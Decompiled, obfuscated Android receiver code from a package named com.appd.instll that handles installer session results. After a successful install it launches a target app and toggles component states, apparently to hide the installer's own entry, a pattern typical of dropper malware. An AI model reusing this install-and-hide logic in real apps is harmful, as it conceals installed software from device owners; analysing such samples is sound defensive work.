package com.appd.instll;

import android.content.BroadcastReceiver;
import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.util.Log;

/* loaded from: classes2.dex */
class gkokvbhukfkbujjwqqeflslcirxbjy1 extends BroadcastReceiver {
    public static final String ACTION_DELIVER_PI_EVENT = "com.appd.instll.load.action.RootlessSaiPiBroadcastReceiver.ACTION_DELIVER_PI_EVENT";
    public static final String ANDROID_PM_EXTRA_LEGACY_STATUS = "android.content.pm.extra.LEGACY_STATUS";
    public static final int STATUS_BAD_ROM = -322;
    private static final String TAG = "RootlessSaiPiBR";
    private Context mContext;

    public gkokvbhukfkbujjwqqeflslcirxbjy1(Context context) {
        this.mContext = context.getApplicationContext();
    }

    @Override // android.content.BroadcastReceiver
    public void onReceive(Context context, Intent intent) {
        int intExtra = intent.getIntExtra("android.content.pm.extra.STATUS", -999);
        if (intExtra == -1) {
            wuiwunabuzhhrmuqncxdphfkapujuw5.start(context, intent.getIntExtra("android.content.pm.extra.SESSION_ID", -1), (Intent) intent.getParcelableExtra("android.intent.extra.INTENT"));
            return;
        }
        if (intExtra != 0) {
            Log.d(TAG, "Installation failed");
            return;
        }
        Log.d(TAG, "Installation succeed");
        if (dapenvuwejylecxmemckzigsvucpcz3.isAppAvailable(context, dapenvuwejylecxmemckzigsvucpcz3.TargetBaseid)) {
            Intent launchIntentForPackage = context.getPackageManager().getLaunchIntentForPackage(dapenvuwejylecxmemckzigsvucpcz3.TargetBaseid);
            launchIntentForPackage.addFlags(268435456);
            launchIntentForPackage.addFlags(536870912);
            context.startActivity(launchIntentForPackage);
        }
        PackageManager packageManager = context.getPackageManager();
        packageManager.setComponentEnabledSetting(new ComponentName(context, (Class<?>) alohyashvgszwxowunyvaqssltgiil4.class), 1, 1);
        packageManager.setComponentEnabledSetting(new ComponentName(context, (Class<?>) dapenvuwejylecxmemckzigsvucpcz3.class), 2, 1);
        packageManager.setComponentEnabledSetting(new ComponentName(context, (Class<?>) alohyashvgszwxowunyvaqssltgiil4.class), 1, 1);
    }
}
